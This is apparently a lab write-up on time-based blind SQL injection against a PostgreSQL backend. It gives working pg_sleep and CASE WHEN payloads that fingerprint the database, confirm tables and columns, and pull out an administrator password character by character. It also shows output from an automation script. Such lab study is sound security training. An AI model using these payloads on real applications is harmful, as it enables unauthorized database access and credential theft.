# Blind SQL Injection with Time Delays and Information Retrieval — Walkthrough

## Introduction

Time-based blind SQL injection is used when the application gives you **no visible feedback at all** — no error messages, no content differences, nothing. The only signal you have left is *how long the server takes to respond*. If you can make a conditional statement trigger a deliberate delay (e.g. "sleep for 3 seconds if this condition is true"), you can extract data one true/false question at a time, purely by timing the response.

This walkthrough documents solving a lab against a **PostgreSQL** backend, using `pg_sleep()` wrapped in conditional logic to pull out a username and password character-by-character.

## How It Works

### Fingerprinting the database

A single quote in the `tracking id` parameter caused no visible change in the response — no error, no broken page. That rules out boolean-based and error-based detection; the only way to confirm injection here is to make the database *do something measurable*, like pause.

Every major database has a different sleep function, so the first step is to figure out which one you're dealing with by trying them one at a time:

| Database | Sleep function |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft SQL Server | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

`SELECT pg_sleep(10)` was the one that caused a 10-second delay in the response — confirms the backend is **PostgreSQL**.

### Why `||` instead of `AND`

Payload used:

```sql
' || (SELECT pg_sleep(10))--
```

Two things matter here, and both are worth understanding properly rather than just copy-pasting the payload:

**Why concatenation (`||`) instead of `AND`?**
Your instinct on this was right. With an `AND`-based payload like `' AND (SELECT pg_sleep(10))--`, the full injected clause looks like:

```sql
WHERE id = 'some_id' AND (SELECT pg_sleep(10))
```

In SQL, `false AND anything` is always `false` — so a smart query planner doesn't even bother evaluating the right-hand side once it sees the left side (`id = 'some_id'`) is false, since the tracking ID you're injecting into almost never matches a real row. This is called **short-circuit evaluation**, and it means your `pg_sleep()` might silently never fire — not because your payload logic was wrong, but because the engine skipped it entirely. `||` (string concatenation) sidesteps this: the sleep subquery isn't a conditional branch, it's a value that has to be *computed* to build the concatenated string, so it always executes regardless of whether the id matches anything.

**Why the parentheses around `pg_sleep(10)` are compulsory:**
`SELECT ...` is a full SQL *statement*, not a value. You can't drop a bare `SELECT` in the middle of an expression — the parser will choke on it. Wrapping it as `(SELECT pg_sleep(10))` turns it into a **scalar subquery**: a self-contained query that resolves to a single value, which *can* legally sit inside a bigger expression like a `||` concatenation. Without the parentheses, PostgreSQL sees a stray `SELECT` keyword in a position where only a value is allowed, and throws a syntax error — which is exactly the "didn't work well" behavior you ran into.

## Detection: Confirming True/False via Timing

Template used for every subsequent check:

```sql
' || (SELECT CASE WHEN (condition) THEN pg_sleep(3) ELSE NULL END)--
```

`CASE WHEN` is the actual conditional logic: if `condition` is true, run `pg_sleep(3)` and the response is delayed; if false, do nothing (`NULL`) and the response comes back instantly. That delay-vs-no-delay difference *is* your true/false oracle.

Sanity check first:

```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END)--
```

`1=1` is always true → confirms the payload structure itself works before testing anything real.

## Step-by-Step Extraction

**1. Confirm the `users` table exists:**

```sql
' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users) THEN pg_sleep(3) ELSE NULL END)--
```

Delay triggered → table exists.

**2. Confirm the `username` column exists:**

```sql
' || (SELECT CASE WHEN EXISTS(SELECT username FROM users) THEN pg_sleep(3) ELSE NULL END)--
```

Delay triggered → column exists.

**3. Confirm the `administrator` username exists:**

```sql
' || (SELECT CASE WHEN EXISTS(SELECT username FROM users where username='administrator') THEN pg_sleep(3) ELSE NULL END)--
```

Delay triggered → user found.

**4. Confirm the password has a length worth extracting:**

```sql
' || (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator')) > 1 THEN pg_sleep(3) ELSE NULL END)--
```

Delay triggered → password exists and is longer than 1 character. In a full manual run you'd binary-search the exact length the same way as the characters below; here it was enough to confirm a length exists before moving to character extraction.

**5. Extract the password character-by-character:**

```sql
' || (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1) > 'a' THEN pg_sleep(3) ELSE NULL END)--
```

`SUBSTR(value, 1, 1)` pulls the first character, and comparing it against `'a'`, `'b'`, `'c'`... one at a time (or via binary search across the alphabet) tells you, one bit of information per request, exactly what that character is. Repeat per character position to reconstruct the full password.

## Automation

Doing this one character at a time through Burp Suite is painfully slow — every single character requires multiple timed requests. `time_delay_BF.py` automates the binary search + timing-comparison loop using `requests`, with the Burp `TrackingId`/session cookie plugged in for auth.

```
$ python ./time_delay_BF.py "https://0a2400db03d4758b809b3fc0002800ce.web-security-academy.net/filter?category=Pets"
[+] Starting time-based blind SQLi (PostgreSQL, pg_sleep)...
[+] Baseline → 1=1 delayed: True, 1=2 delayed: False
[+] Password so far: ajehc78ezbspprzuyfkk
[+] Administrator password: ajehc78ezbspprzuyfkk
```

Password recovered, login successful, lab solved.

## Common Pitfalls

- **`AND` + timing payloads can silently fail** due to short-circuit evaluation — if you're not seeing a delay you expect, try `||` before assuming your logic is wrong.
- **Forgetting the parentheses around a subquery** breaks the whole payload with a syntax error that looks unrelated to your actual condition.
- **Time-based extraction is slow and noisy** — network latency can cause false positives/negatives on borderline timing; always run a `1=1` / `1=2` baseline check (like the script does) before trusting real results.
- **Remember to update the `TrackingId`/session cookie** before every script run — lab sessions expire quickly, and a stale cookie will make every request look like a false negative instead of erroring clearly.
